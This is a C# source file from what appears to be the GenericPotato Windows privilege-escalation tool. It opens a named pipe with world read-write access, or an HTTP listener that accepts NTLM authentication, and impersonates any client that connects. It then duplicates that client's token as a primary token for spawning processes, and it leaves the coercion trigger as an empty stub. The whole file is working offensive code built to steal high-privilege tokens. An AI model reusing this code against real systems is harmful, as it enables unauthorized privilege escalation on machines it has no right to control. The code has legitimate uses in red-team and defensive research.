using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace GenericPotato {
    public enum ExecutionMethod
    {
        Auto,
        Token,
        User
    }
    internal class PotatoAPI {

        Thread listener;
        NamedPipeServerStream spoolPipe;
        Mode mode;
        public EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);
        IntPtr systemImpersonationToken = IntPtr.Zero;

        readonly int port;
        readonly string host;

        public enum Mode
        {
            HTTP,
            NamedPipe
        }

        public IntPtr Token {
            get {
                return systemImpersonationToken;
            }
        }


        public PotatoAPI(ushort port, string host, Mode mode) {

            this.port = port;
            this.host = host;
            this.mode = mode;

            switch (mode)
            {
                case Mode.NamedPipe:
                    listener = new Thread(NamedPipeListener);
                    listener.Start();
                    break;
                case Mode.HTTP:
                    listener = new Thread(HTTPListener);
                    listener.Start();
                    break;
            }
        }

        void NamedPipeListener()
        {
            string hostName = System.Net.Dns.GetHostName();
            byte[] data = new byte[4];

            PipeSecurity ps = new PipeSecurity();
            SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
            PipeAccessRule par = new PipeAccessRule(sid, PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow);
            ps.AddAccessRule(par);

            Console.WriteLine($"[+] Starting named pipe at \\\\{hostName}\\pipe\\test");
            spoolPipe = new NamedPipeServerStream($"test", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048, ps);
            readyEvent.Set();

            spoolPipe.WaitForConnection();
            Console.WriteLine("[+] Received connection to our named pipe");

            spoolPipe.Read(data, 0, 4);

            spoolPipe.RunAsClient(() => {
                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle))
                {
                    Console.WriteLine("[-] Failed to open thread token");
                    return;
                }

                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken))
                {
                    Console.WriteLine("[-] Failed to duplicate impersonation token");
                    return;
                }

                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
            });

            readyEvent.Set();
            spoolPipe.Close();
        }

        void HTTPListener()
        {

            Console.WriteLine($"[+] Starting HTTP listener on port http://{host}:{port}");
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add($"http://{host}:{port}/");
            listener.Start();
            listener.AuthenticationSchemes = AuthenticationSchemes.IntegratedWindowsAuthentication;
            listener.UnsafeConnectionNtlmAuthentication = true;
            listener.IgnoreWriteExceptions = true;
            readyEvent.Set();

            HttpListenerContext context = listener.GetContext();
            Console.WriteLine("Request for: " + context.Request.Url.LocalPath);
            Console.WriteLine("Client: " + context.User.Identity.Name);

            var identity = (System.Security.Principal.WindowsIdentity)context.User.Identity;

            using (System.Security.Principal.WindowsImpersonationContext wic = identity.Impersonate())
            {
                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle))
                {
                    Console.WriteLine("[-] Failed to open thread token");
                    return;
                }

                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken))
                {
                    Console.WriteLine("[-] Failed to duplicate impersonation token");
                    return;
                }

                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
            }

            readyEvent.Set();
        }

        public bool Trigger()
        {
            // Put your trigger code here
            return true;
        }
    }
}
